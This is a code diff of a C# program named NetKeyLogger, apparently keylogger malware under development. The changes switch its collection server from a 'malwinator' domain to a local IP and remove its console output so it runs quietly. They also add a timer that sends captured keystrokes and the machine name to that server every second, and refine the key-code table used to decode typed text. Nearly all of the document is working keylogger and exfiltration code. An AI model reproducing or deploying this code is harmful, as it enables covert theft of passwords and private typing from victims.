@@ -1,4 +1,4 @@
-﻿using Newtonsoft.Json;
+using Newtonsoft.Json;
 using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -14,18 +14,19 @@ namespace NetKeyLogger
         static private string machineName;
         static private KeyValuePair<string, string> machineNameFormData;
         static private HttpClient server = new HttpClient();
+        static private string str;
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main(string[] args)
         {
-            url = new Uri("https://malwinator.chickenkiller.com");
+            url = new Uri("http://10.11.97.215:5000");
+
+            //url = new Uri( args[0]);
 
             machineName = System.Environment.MachineName;
 
             machineNameFormData = new KeyValuePair<string, string>("name", machineName);
-
-            Console.Write(machineName);
 
             keys = GetKeys();
 
@@ -35,11 +36,13 @@ namespace NetKeyLogger
         static void KeyLogger()
         {
             keys? letter = null;
+            str = "";
+            Timer timer = new Timer(TimerCallback, null, TimeSpan.FromSeconds(1), TimeSpan.FromSeconds(1));
             while (true)
             {
                 for (int i = 0; i < 255; i++)
                 {
-                    if (GetAsyncKeyState(i) ==32769 )
+                    if (GetAsyncKeyState(i) == 32769)
                     {
                         letter = keys.FirstOrDefault(x => x.digit == i);
 
@@ -47,23 +50,21 @@ namespace NetKeyLogger
 
                         if (letter != null)
                         {
-                            Console.WriteLine(letter.value);
-                           
+
                             l = letter.value;
                         }
                         else
                         {
-                            Console.WriteLine(i.ToString());
                             l = i.ToString();
                         }
-                       
-                        WriteOutput(l);
-                        break;
+                        str += l;
                     }
-                    
+
                 }
             }
         }
+
+
         static void WriteOutput(string value)
         {
             KeyValuePair<string, string> logFormData = new KeyValuePair<string, string>("key", value);
@@ -74,8 +75,16 @@ namespace NetKeyLogger
              })).Result.Content.ReadAsStringAsync().Result;
 
             System.Console.WriteLine(requestResult);
-            Thread.Sleep(5 * 1000);
+            str = "";
+
+            //Console.WriteLine(value);
         }
+
+        static void TimerCallback(object state)
+        {
+            WriteOutput(str);
+        }
+
         static List<keys> GetKeys()
         {
             var keys = new List<keys>();
@@ -83,15 +92,15 @@ namespace NetKeyLogger
             [
                       {
                         ""digit"": 1,
-                        ""value"": ""[LC]""
+                        ""value"": """"
                       },
                       {
                         ""digit"": 2,
-                        ""value"": ""[RC]""
+                        ""value"": """"
                       },
                       {
                         ""digit"": 8,
-                        ""value"": ""[Back]""
+                        ""value"": """"
                       },
                       {
                         ""digit"": 9,
@@ -104,6 +113,10 @@ namespace NetKeyLogger
                       {
                         ""digit"": 16,
                         ""value"": ""[Shift]""
+                      },
+                      {
+                        ""digit"": 17,
+                        ""value"": """"
                       },
                       {
                         ""digit"": 19,
@@ -119,7 +132,7 @@ namespace NetKeyLogger
                       },
                       {
                         ""digit"": 32,
-                        ""value"": ""[Space]""
+                        ""value"": "" ""
                       },
                       {
                         ""digit"": 33,
@@ -437,7 +450,10 @@ namespace NetKeyLogger
                         ""digit"": 145,
                         ""value"": ""[Scroll Lock]""
                       },
-
+{
+                        ""digit"": 160,
+                        ""value"": """"
+                      },
                       {
                         ""digit"": 162,
                         ""value"": ""[Ctrl]""
@@ -459,6 +475,11 @@ namespace NetKeyLogger
                         ""value"": "",""
                       },
                       {
+                        ""digit"": 189,
+                        ""value"": ""-""
+                      },
+
+                      {
                         ""digit"": 190,
                         ""value"": "".""
                       },
@@ -473,14 +494,6 @@ namespace NetKeyLogger
             ]";
 
             keys = JsonConvert.DeserializeObject<List<keys>>(jsonString);
-
-            //string path =Environment.CurrentDirectory.ToLower() + "\\keys.json";
-
-            //using (StreamReader r = new StreamReader(path))
-            //{
-            //    string json = r.ReadToEnd();
-            //    keys = JsonConvert.DeserializeObject<List<keys>>(json);
-            //}
             return keys;
         }
     }
